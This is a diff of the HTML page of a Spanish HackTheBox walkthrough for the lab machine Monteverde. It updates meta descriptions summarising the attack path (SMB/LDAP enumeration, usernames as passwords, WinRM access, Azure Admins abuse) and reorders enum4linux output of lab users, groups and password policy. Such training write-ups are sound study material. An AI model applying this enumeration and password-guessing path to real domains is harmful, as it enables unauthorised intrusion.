@@ -1229,7 +1229,7 @@
 
 
     
-<meta name="description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español" />
+<meta name="description" content="Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado." />
 
 
 <meta name="keywords" content="azureAD,enum4linux,smbmap,evil-winrm">
@@ -1246,7 +1246,7 @@
 <meta property="og:title" content="Hack The Box - Monteverde">
 <meta property="og:url" content="https://sckull.github.io/posts/monteverde/">
 <meta property="og:type" content="article">
-<meta property="og:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
+<meta property="og:description" content="Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado.">
 
   
     <meta property="og:image" content="https://sckull.github.io/images/posts/htb/monteverde/cover.webp">
@@ -1254,7 +1254,7 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:app:name:iphone" content="sckull">
     <meta property="twitter:title" content="Hack The Box - Monteverde">
-    <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
+    <meta property="twitter:description" content="Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado.">
   
 
 <meta name="generator" content="Hugo 0.68.3" />
@@ -1284,7 +1284,7 @@
     "datePublished": "2020-06-13T00:00:00Z",
     "dateModified": "2020-06-13T00:00:00Z",
     "url" : "https://sckull.github.io/posts/monteverde/",
-    "description": "Monteverde es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.",
+    "description": "Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado.",
     "keywords": ["azureAD","enum4linux","smbmap","evil-winrm"],
     "image" : "https://sckull.github.io/images/posts/htb/monteverde/cover.webp",
     "author": {
@@ -1607,8 +1607,7 @@
     </div>
     <article class="single__contents" data-dir="ltr" data-ani="true">
       
-      <p>Monteverde es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</p>
-
+      
 
 
 
@@ -1620,6 +1619,7 @@
     <img src="/images/posts/htb/monteverde/cover.webp" alt="featured image" class="featured-image" style="width: ;height: ;">
   </div>
 
+<p>Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado.</p>
 <h1 id="informacion-de-la-maquina">Informacion de la Maquina</h1>
 <table>
 <thead>
@@ -1785,7 +1785,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="enum4linux">ENUM4LINUX</h2>
-<p>Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.</p>
+<p>Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba y ldap con enum4linux, enumerando los usuarios dentro de la maquina.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">  1
@@ -1975,268 +1975,198 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">185
 </span><span class="lnt">186
 </span><span class="lnt">187
-</span><span class="lnt">188
-</span><span class="lnt">189
-</span><span class="lnt">190
-</span><span class="lnt">191
-</span><span class="lnt">192
-</span><span class="lnt">193
-</span><span class="lnt">194
-</span><span class="lnt">195
-</span><span class="lnt">196
-</span><span class="lnt">197
-</span><span class="lnt">198
-</span><span class="lnt">199
-</span><span class="lnt">200
-</span><span class="lnt">201
-</span><span class="lnt">202
-</span><span class="lnt">203
-</span><span class="lnt">204
-</span><span class="lnt">205
-</span><span class="lnt">206
-</span><span class="lnt">207
-</span><span class="lnt">208
-</span><span class="lnt">209
-</span><span class="lnt">210
-</span><span class="lnt">211
-</span><span class="lnt">212
-</span><span class="lnt">213
-</span><span class="lnt">214
-</span><span class="lnt">215
-</span><span class="lnt">216
-</span><span class="lnt">217
-</span><span class="lnt">218
-</span><span class="lnt">219
-</span><span class="lnt">220
-</span><span class="lnt">221
-</span><span class="lnt">222
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Sat Jan <span class="m">18</span> 19:15:47 <span class="nv">2020</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Sat Jan <span class="m">18</span> 19:15:47 <span class="m">2020</span>
 
- <span class="o">==========================</span> 
-<span class="p">|</span>    Target Information    <span class="p">|</span>
- <span class="o">==========================</span> 
-Target ........... 10.10.10.172
-RID Range ........ 500-550,1000-1050
-Username ......... <span class="s1">&#39;&#39;</span>
-Password ......... <span class="s1">&#39;&#39;</span>
-Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, <span class="nv">none</span>
+<span class="o">[</span> ... REDACTED ... <span class="o">]</span> 
 
+ <span class="o">===========================================</span> 
+<span class="p">|</span>    Getting domain SID <span class="k">for</span> 10.10.10.172    <span class="p">|</span>
+ <span class="o">===========================================</span> 
+Domain Name: MEGABANK
+Domain Sid: S-1-5-21-391775091-850290835-3566037492
+<span class="o">[</span>+<span class="o">]</span> Host is part of a domain <span class="o">(</span>not a workgroup<span class="o">)</span>
 
- <span class="o">====================================================</span> 
-<span class="p">|</span>    Enumerating Workgroup/Domain on 10.10.10.172    <span class="p">|</span>
- <span class="o">====================================================</span> 
-<span class="o">[</span>E<span class="o">]</span> Can<span class="s1">&#39;t find workgroup/domain
+ <span class="o">======================================</span> 
+<span class="p">|</span>    OS information on 10.10.10.172    <span class="p">|</span>
+ <span class="o">======================================</span> 
+<span class="o">[</span>+<span class="o">]</span> Got OS info <span class="k">for</span> 10.10.10.172 from smbclient: 
+<span class="o">[</span>+<span class="o">]</span> Got OS info <span class="k">for</span> 10.10.10.172 from srvinfo:
+Could not initialise srvsvc. Error was <span class="nv">NT_STATUS_ACCESS_DENIED</span>
+
+ <span class="o">=============================</span> 
+<span class="p">|</span>    Users on 10.10.10.172    <span class="p">|</span>
+ <span class="o">=============================</span> 
+index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account <span class="k">for</span> the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: <span class="o">(</span>null<span class="o">)</span>
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for</span> guest access to the computer/domain
+index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: <span class="o">(</span>null<span class="o">)</span>
+index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O<span class="s1">&#39;Leary	Desc: (null)
+</span><span class="s1">index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
+</span><span class="s1">index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
+</span><span class="s1">index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
+</span><span class="s1">index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
+</span><span class="s1">index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
+</span><span class="s1">
+</span><span class="s1">user:[Guest] rid:[0x1f5]
+</span><span class="s1">user:[AAD_987d7f2f57d2] rid:[0x450]
+</span><span class="s1">user:[mhope] rid:[0x641]
+</span><span class="s1">user:[SABatchJobs] rid:[0xa2a]
+</span><span class="s1">user:[svc-ata] rid:[0xa2b]
+</span><span class="s1">user:[svc-bexec] rid:[0xa2c]
+</span><span class="s1">user:[svc-netapp] rid:[0xa2d]
+</span><span class="s1">user:[dgalanos] rid:[0xa35]
+</span><span class="s1">user:[roleary] rid:[0xa36]
+</span><span class="s1">user:[smorgan] rid:[0xa37]
+</span><span class="s1">
+</span><span class="s1"> ========================================= 
+</span><span class="s1">|    Share Enumeration on 10.10.10.172    |
+</span><span class="s1"> ========================================= 
+</span><span class="s1">
+</span><span class="s1">	Sharename       Type      Comment
+</span><span class="s1">	---------       ----      -------
+</span><span class="s1">SMB1 disabled -- no workgroup available
+</span><span class="s1">
+</span><span class="s1">[+] Attempting to map shares on 10.10.10.172
+</span><span class="s1">
+</span><span class="s1"> ==================================================== 
+</span><span class="s1">|    Password Policy Information for 10.10.10.172    |
+</span><span class="s1"> ==================================================== 
 </span><span class="s1">
 </span><span class="s1">
-</span><span class="s1"> ============================================ 
-</span><span class="s1">|    Nbtstat Information for 10.10.10.172    |
-</span><span class="s1"> ============================================ 
-</span><span class="s1">Looking up status of 10.10.10.172
-</span><span class="s1">No reply from 10.10.10.172
+</span><span class="s1">[+] Attaching to 10.10.10.172 using a NULL share
 </span><span class="s1">
-</span><span class="s1"> ===================================== 
-</span><span class="s1">|    Session Check on 10.10.10.172    |
-</span><span class="s1"> ===================================== 
-</span><span class="s1">[+] Server 10.10.10.172 allows sessions using username &#39;&#39;, password &#39;&#39;
-</span><span class="s1">[+] Got domain/workgroup name: 
+</span><span class="s1">[+] Trying protocol 445/SMB...
 </span><span class="s1">
-</span><span class="s1"> =========================================== 
-</span><span class="s1">|    Getting domain SID for 10.10.10.172    |
-</span><span class="s1"> =========================================== 
-</span><span class="s1">Domain Name: MEGABANK
-</span><span class="s1">Domain Sid: S-1-5-21-391775091-850290835-3566037492
-</span><span class="s1">[+] Host is part of a domain (not a workgroup)
+</span><span class="s1">[+] Found domain(s):
 </span><span class="s1">
-</span><span class="s1"> ====================================== 
-</span><span class="s1">|    OS information on 10.10.10.172    |
-</span><span class="s1"> ====================================== 
-</span><span class="s1">[+] Got OS info for 10.10.10.172 from smbclient: 
-</span><span class="s1">[+] Got OS info for 10.10.10.172 from srvinfo:
-</span><span class="s1">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+</span><span class="s1">	[+] MEGABANK
+</span><span class="s1">	[+] Builtin
 </span><span class="s1">
-</span><span class="s1"> ============================= 
-</span><span class="s1">|    Users on 10.10.10.172    |
-</span><span class="s1"> ============================= 
-</span><span class="s1">index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
-</span><span class="s1">index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
-</span><span class="s1">index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
-</span><span class="s1">index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
-</span><span class="s1">index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O&#39;</span>Leary	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: <span class="o">(</span>null<span class="o">)</span>
+</span><span class="s1">[+] Password Info for Domain: MEGABANK
+</span><span class="s1">
+</span><span class="s1">	[+] Minimum password length: 7
+</span><span class="s1">	[+] Password history length: 24
+</span><span class="s1">	[+] Maximum password age: 41 days 23 hours 53 minutes 
+</span><span class="s1">	[+] Password Complexity Flags: 000000
+</span><span class="s1">
+</span><span class="s1">		[+] Domain Refuse Password Change: 0
+</span><span class="s1">		[+] Domain Password Store Cleartext: 0
+</span><span class="s1">		[+] Domain Password Lockout Admins: 0
+</span><span class="s1">		[+] Domain Password No Clear Change: 0
+</span><span class="s1">		[+] Domain Password No Anon Change: 0
+</span><span class="s1">		[+] Domain Password Complex: 0
+</span><span class="s1">
+</span><span class="s1">	[+] Minimum password age: 1 day 4 minutes 
+</span><span class="s1">	[+] Reset Account Lockout Counter: 30 minutes 
+</span><span class="s1">	[+] Locked Account Duration: 30 minutes 
+</span><span class="s1">	[+] Account Lockout Threshold: None
+</span><span class="s1">	[+] Forced Log off Time: Not Set
+</span><span class="s1">
+</span><span class="s1">
+</span><span class="s1">[+] Retieved partial password policy with rpcclient:
+</span><span class="s1">
+</span><span class="s1">Password Complexity: Disabled
+</span><span class="s1">Minimum Password Length: 7
+</span><span class="s1">
+</span><span class="s1">
+</span><span class="s1"> ============================== 
+</span><span class="s1">|    Groups on 10.10.10.172    |
+</span><span class="s1"> ============================== 
+</span><span class="s1">
+</span><span class="s1">[+] Getting builtin groups:
+</span><span class="s1">group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
+</span><span class="s1">group:[Incoming Forest Trust Builders] rid:[0x22d]
+</span><span class="s1">group:[Windows Authorization Access Group] rid:[0x230]
+</span><span class="s1">group:[Terminal Server License Servers] rid:[0x231]
+</span><span class="s1">group:[Users] rid:[0x221]
+</span><span class="s1">group:[Guests] rid:[0x222]
+</span><span class="s1">group:[Remote Desktop Users] rid:[0x22b]
+</span><span class="s1">group:[Network Configuration Operators] rid:[0x22c]
+</span><span class="s1">group:[Performance Monitor Users] rid:[0x22e]
+</span><span class="s1">group:[Performance Log Users] rid:[0x22f]
+</span><span class="s1">group:[Distributed COM Users] rid:[0x232]
+</span><span class="s1">group:[IIS_IUSRS] rid:[0x238]
+</span><span class="s1">group:[Cryptographic Operators] rid:[0x239]
+</span><span class="s1">group:[Event Log Readers] rid:[0x23d]
+</span><span class="s1">group:[Certificate Service DCOM Access] rid:[0x23e]
+</span><span class="s1">group:[RDS Remote Access Servers] rid:[0x23f]
+</span><span class="s1">group:[RDS Endpoint Servers] rid:[0x240]
+</span><span class="s1">group:[RDS Management Servers] rid:[0x241]
+</span><span class="s1">group:[Hyper-V Administrators] rid:[0x242]
+</span><span class="s1">group:[Access Control Assistance Operators] rid:[0x243]
+</span><span class="s1">group:[Remote Management Users] rid:[0x244]
+</span><span class="s1">group:[Storage Replica Administrators] rid:[0x246]
+</span><span class="s1">
+</span><span class="s1">[+] Getting builtin group memberships:
+</span><span class="s1">Group &#39;</span>IIS_IUSRS<span class="s1">&#39; (RID: 568) has member: Couldn&#39;</span>t lookup SIDs
+Group <span class="s1">&#39;Guests&#39;</span> <span class="o">(</span>RID: 546<span class="o">)</span> has member: Couldn<span class="s1">&#39;t lookup SIDs
+</span><span class="s1">Group &#39;</span>Incoming Forest Trust Builders<span class="s1">&#39; (RID: 557) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
+</span><span class="s1">Group &#39;</span>Pre-Windows <span class="m">2000</span> Compatible Access<span class="s1">&#39; (RID: 554) has member: Couldn&#39;</span>t lookup SIDs
+Group <span class="s1">&#39;Windows Authorization Access Group&#39;</span> <span class="o">(</span>RID: 560<span class="o">)</span> has member: Couldn<span class="s1">&#39;t lookup SIDs
+</span><span class="s1">Group &#39;</span>Remote Management Users<span class="s1">&#39; (RID: 580) has member: Couldn&#39;</span>t lookup SIDs
+Group <span class="s1">&#39;Users&#39;</span> <span class="o">(</span>RID: 545<span class="o">)</span> has member: Couldn<span class="s1">&#39;t lookup SIDs
+</span><span class="s1">
+</span><span class="s1">[+] Getting local groups:
+</span><span class="s1">group:[Cert Publishers] rid:[0x205]
+</span><span class="s1">group:[RAS and IAS Servers] rid:[0x229]
+</span><span class="s1">group:[Allowed RODC Password Replication Group] rid:[0x23b]
+</span><span class="s1">group:[Denied RODC Password Replication Group] rid:[0x23c]
+</span><span class="s1">group:[DnsAdmins] rid:[0x44d]
+</span><span class="s1">group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
+</span><span class="s1">group:[ADSyncAdmins] rid:[0x451]
+</span><span class="s1">group:[ADSyncOperators] rid:[0x452]
+</span><span class="s1">group:[ADSyncBrowse] rid:[0x453]
+</span><span class="s1">group:[ADSyncPasswordSet] rid:[0x454]
+</span><span class="s1">
+</span><span class="s1">[+] Getting local group memberships:
+</span><span class="s1">Group &#39;</span>ADSyncAdmins<span class="s1">&#39; (RID: 1105) has member: Couldn&#39;</span>t lookup SIDs
+Group <span class="s1">&#39;Denied RODC Password Replication Group&#39;</span> <span class="o">(</span>RID: 572<span class="o">)</span> has member: Couldn<span class="s1">&#39;t lookup SIDs
+</span><span class="s1">
+</span><span class="s1">[+] Getting domain groups:
+</span><span class="s1">group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+</span><span class="s1">group:[Domain Users] rid:[0x201]
+</span><span class="s1">group:[Domain Guests] rid:[0x202]
+</span><span class="s1">group:[Domain Computers] rid:[0x203]
+</span><span class="s1">group:[Group Policy Creator Owners] rid:[0x208]
+</span><span class="s1">group:[Cloneable Domain Controllers] rid:[0x20a]
+</span><span class="s1">group:[Protected Users] rid:[0x20d]
+</span><span class="s1">group:[DnsUpdateProxy] rid:[0x44e]
+</span><span class="s1">group:[Azure Admins] rid:[0xa29]
+</span><span class="s1">group:[File Server Admins] rid:[0xa2e]
+</span><span class="s1">group:[Call Recording Admins] rid:[0xa2f]
+</span><span class="s1">group:[Reception] rid:[0xa30]
+</span><span class="s1">group:[Operations] rid:[0xa31]
+</span><span class="s1">group:[Trading] rid:[0xa32]
+</span><span class="s1">group:[HelpDesk] rid:[0xa33]
+</span><span class="s1">group:[Developers] rid:[0xa34]
+</span><span class="s1">
+</span><span class="s1">[+] Getting domain group memberships:
+</span><span class="s1">Group &#39;</span>HelpDesk<span class="s1">&#39; (RID: 2611) has member: MEGABANK\roleary
+</span><span class="s1">Group &#39;</span>Trading<span class="s1">&#39; (RID: 2610) has member: MEGABANK\dgalanos
+</span><span class="s1">Group &#39;</span>Operations<span class="s1">&#39; (RID: 2609) has member: MEGABANK\smorgan
+</span><span class="s1">Group &#39;</span>Azure Admins<span class="s1">&#39; (RID: 2601) has member: MEGABANK\Administrator
+</span><span class="s1">Group &#39;</span>Azure Admins<span class="s1">&#39; (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
+</span><span class="s1">Group &#39;</span>Azure Admins<span class="s1">&#39; (RID: 2601) has member: MEGABANK\mhope
+</span><span class="s1">Group &#39;</span>Domain Guests<span class="s1">&#39; (RID: 514) has member: MEGABANK\Guest
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\Administrator
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\krbtgt
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\mhope
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\SABatchJobs
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\svc-ata
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\svc-bexec
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\svc-netapp
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\dgalanos
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\roleary
+</span><span class="s1">Group &#39;</span>Domain Users<span class="s1">&#39; (RID: 513) has member: MEGABANK\smorgan
+</span><span class="s1">Group &#39;</span>Group Policy Creator Owners<span class="err">&#39;</span> <span class="o">(</span>RID: 520<span class="o">)</span> has member: MEGABANK<span class="se">\A</span>dministrator
 
-user:<span class="o">[</span>Guest<span class="o">]</span> rid:<span class="o">[</span>0x1f5<span class="o">]</span>
-user:<span class="o">[</span>AAD_987d7f2f57d2<span class="o">]</span> rid:<span class="o">[</span>0x450<span class="o">]</span>
-user:<span class="o">[</span>mhope<span class="o">]</span> rid:<span class="o">[</span>0x641<span class="o">]</span>
-user:<span class="o">[</span>SABatchJobs<span class="o">]</span> rid:<span class="o">[</span>0xa2a<span class="o">]</span>
-user:<span class="o">[</span>svc-ata<span class="o">]</span> rid:<span class="o">[</span>0xa2b<span class="o">]</span>
-user:<span class="o">[</span>svc-bexec<span class="o">]</span> rid:<span class="o">[</span>0xa2c<span class="o">]</span>
-user:<span class="o">[</span>svc-netapp<span class="o">]</span> rid:<span class="o">[</span>0xa2d<span class="o">]</span>
-user:<span class="o">[</span>dgalanos<span class="o">]</span> rid:<span class="o">[</span>0xa35<span class="o">]</span>
-user:<span class="o">[</span>roleary<span class="o">]</span> rid:<span class="o">[</span>0xa36<span class="o">]</span>
-user:<span class="o">[</span>smorgan<span class="o">]</span> rid:<span class="o">[</span>0xa37<span class="o">]</span>
-
- <span class="o">=========================================</span> 
-<span class="p">|</span>    Share Enumeration on 10.10.10.172    <span class="p">|</span>
- <span class="o">=========================================</span> 
-
-	Sharename       Type      Comment
-	---------       ----      -------
-SMB1 disabled -- no workgroup available
-
-<span class="o">[</span>+<span class="o">]</span> Attempting to map shares on 10.10.10.172
-
- <span class="o">====================================================</span> 
-<span class="p">|</span>    Password Policy Information <span class="k">for</span> 10.10.10.172    <span class="p">|</span>
- <span class="o">====================================================</span> 
-
-
-<span class="o">[</span>+<span class="o">]</span> Attaching to 10.10.10.172 using a NULL share
-
-<span class="o">[</span>+<span class="o">]</span> Trying protocol 445/SMB...
-
-<span class="o">[</span>+<span class="o">]</span> Found domain<span class="o">(</span>s<span class="o">)</span>:
-
-	<span class="o">[</span>+<span class="o">]</span> MEGABANK
-	<span class="o">[</span>+<span class="o">]</span> Builtin
-
-<span class="o">[</span>+<span class="o">]</span> Password Info <span class="k">for</span> Domain: MEGABANK
-
-	<span class="o">[</span>+<span class="o">]</span> Minimum password length: <span class="m">7</span>
-	<span class="o">[</span>+<span class="o">]</span> Password <span class="nb">history</span> length: <span class="m">24</span>
-	<span class="o">[</span>+<span class="o">]</span> Maximum password age: <span class="m">41</span> days <span class="m">23</span> hours <span class="m">53</span> minutes 
-	<span class="o">[</span>+<span class="o">]</span> Password Complexity Flags: <span class="m">000000</span>
-
-		<span class="o">[</span>+<span class="o">]</span> Domain Refuse Password Change: <span class="m">0</span>
-		<span class="o">[</span>+<span class="o">]</span> Domain Password Store Cleartext: <span class="m">0</span>
-		<span class="o">[</span>+<span class="o">]</span> Domain Password Lockout Admins: <span class="m">0</span>
-		<span class="o">[</span>+<span class="o">]</span> Domain Password No Clear Change: <span class="m">0</span>
-		<span class="o">[</span>+<span class="o">]</span> Domain Password No Anon Change: <span class="m">0</span>
-		<span class="o">[</span>+<span class="o">]</span> Domain Password Complex: <span class="m">0</span>
-
-	<span class="o">[</span>+<span class="o">]</span> Minimum password age: <span class="m">1</span> day <span class="m">4</span> minutes 
-	<span class="o">[</span>+<span class="o">]</span> Reset Account Lockout Counter: <span class="m">30</span> minutes 
-	<span class="o">[</span>+<span class="o">]</span> Locked Account Duration: <span class="m">30</span> minutes 
-	<span class="o">[</span>+<span class="o">]</span> Account Lockout Threshold: None
-	<span class="o">[</span>+<span class="o">]</span> Forced Log off Time: Not Set
-
-
-<span class="o">[</span>+<span class="o">]</span> Retieved partial password policy with rpcclient:
-
-Password Complexity: Disabled
-Minimum Password Length: <span class="nv">7</span>
-
-
- <span class="o">==============================</span> 
-<span class="p">|</span>    Groups on 10.10.10.172    <span class="p">|</span>
- <span class="o">==============================</span> 
-
-<span class="o">[</span>+<span class="o">]</span> Getting <span class="nb">builtin</span> groups:
-group:<span class="o">[</span>Pre-Windows <span class="m">2000</span> Compatible Access<span class="o">]</span> rid:<span class="o">[</span>0x22a<span class="o">]</span>
-group:<span class="o">[</span>Incoming Forest Trust Builders<span class="o">]</span> rid:<span class="o">[</span>0x22d<span class="o">]</span>
-group:<span class="o">[</span>Windows Authorization Access Group<span class="o">]</span> rid:<span class="o">[</span>0x230<span class="o">]</span>
-group:<span class="o">[</span>Terminal Server License Servers<span class="o">]</span> rid:<span class="o">[</span>0x231<span class="o">]</span>
-group:<span class="o">[</span>Users<span class="o">]</span> rid:<span class="o">[</span>0x221<span class="o">]</span>
-group:<span class="o">[</span>Guests<span class="o">]</span> rid:<span class="o">[</span>0x222<span class="o">]</span>
-group:<span class="o">[</span>Remote Desktop Users<span class="o">]</span> rid:<span class="o">[</span>0x22b<span class="o">]</span>
-group:<span class="o">[</span>Network Configuration Operators<span class="o">]</span> rid:<span class="o">[</span>0x22c<span class="o">]</span>
-group:<span class="o">[</span>Performance Monitor Users<span class="o">]</span> rid:<span class="o">[</span>0x22e<span class="o">]</span>
-group:<span class="o">[</span>Performance Log Users<span class="o">]</span> rid:<span class="o">[</span>0x22f<span class="o">]</span>
-group:<span class="o">[</span>Distributed COM Users<span class="o">]</span> rid:<span class="o">[</span>0x232<span class="o">]</span>
-group:<span class="o">[</span>IIS_IUSRS<span class="o">]</span> rid:<span class="o">[</span>0x238<span class="o">]</span>
-group:<span class="o">[</span>Cryptographic Operators<span class="o">]</span> rid:<span class="o">[</span>0x239<span class="o">]</span>
-group:<span class="o">[</span>Event Log Readers<span class="o">]</span> rid:<span class="o">[</span>0x23d<span class="o">]</span>
-group:<span class="o">[</span>Certificate Service DCOM Access<span class="o">]</span> rid:<span class="o">[</span>0x23e<span class="o">]</span>
-group:<span class="o">[</span>RDS Remote Access Servers<span class="o">]</span> rid:<span class="o">[</span>0x23f<span class="o">]</span>
-group:<span class="o">[</span>RDS Endpoint Servers<span class="o">]</span> rid:<span class="o">[</span>0x240<span class="o">]</span>
-group:<span class="o">[</span>RDS Management Servers<span class="o">]</span> rid:<span class="o">[</span>0x241<span class="o">]</span>
-group:<span class="o">[</span>Hyper-V Administrators<span class="o">]</span> rid:<span class="o">[</span>0x242<span class="o">]</span>
-group:<span class="o">[</span>Access Control Assistance Operators<span class="o">]</span> rid:<span class="o">[</span>0x243<span class="o">]</span>
-group:<span class="o">[</span>Remote Management Users<span class="o">]</span> rid:<span class="o">[</span>0x244<span class="o">]</span>
-group:<span class="o">[</span>Storage Replica Administrators<span class="o">]</span> rid:<span class="o">[</span>0x246<span class="o">]</span>
-
-<span class="o">[</span>+<span class="o">]</span> Getting <span class="nb">builtin</span> group memberships:
-Group <span class="s1">&#39;IIS_IUSRS&#39;</span> <span class="o">(</span>RID: 568<span class="o">)</span> has member: Couldn<span class="s1">&#39;t lookup SIDs
-</span><span class="s1">Group &#39;</span>Guests<span class="s1">&#39; (RID: 546) has member: Couldn&#39;</span>t lookup SIDs
-Group <span class="s1">&#39;Incoming Forest Trust Builders&#39;</span> <span class="o">(</span>RID: 557<span class="o">)</span> has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
-Group <span class="s1">&#39;Pre-Windows 2000 Compatible Access&#39;</span> <span class="o">(</span>RID: 554<span class="o">)</span> has member: Couldn<span class="s1">&#39;t lookup SIDs
-</span><span class="s1">Group &#39;</span>Windows Authorization Access Group<span class="s1">&#39; (RID: 560) has member: Couldn&#39;</span>t lookup SIDs
-Group <span class="s1">&#39;Remote Management Users&#39;</span> <span class="o">(</span>RID: 580<span class="o">)</span> has member: Couldn<span class="s1">&#39;t lookup SIDs
-</span><span class="s1">Group &#39;</span>Users<span class="s1">&#39; (RID: 545) has member: Couldn&#39;</span>t lookup SIDs
-
-<span class="o">[</span>+<span class="o">]</span> Getting <span class="nb">local</span> groups:
-group:<span class="o">[</span>Cert Publishers<span class="o">]</span> rid:<span class="o">[</span>0x205<span class="o">]</span>
-group:<span class="o">[</span>RAS and IAS Servers<span class="o">]</span> rid:<span class="o">[</span>0x229<span class="o">]</span>
